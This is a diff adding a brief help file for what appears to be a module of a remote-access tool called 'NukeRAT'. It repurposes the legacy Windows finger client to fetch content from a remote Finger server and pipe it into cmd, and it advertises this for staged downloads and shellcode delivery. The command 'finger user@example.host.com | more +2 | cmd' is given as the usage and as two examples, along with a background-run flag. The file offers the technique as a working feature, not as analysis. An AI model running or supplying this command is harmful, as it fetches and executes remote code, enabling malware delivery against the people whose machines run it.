@@ -1,0 +1,17 @@
+ABOUT
+    Legacy user information client for remote Finger services.
+    Piped output can feed follow-on command execution for staged
+    download or shellcode delivery.
+
+USAGE:
+    finger user@example.host.com | more +2 | cmd
+
+EXAMPLES:
+    finger user@example.host.com | more +2 | cmd
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    finger user@example.host.com | more +2 | cmd
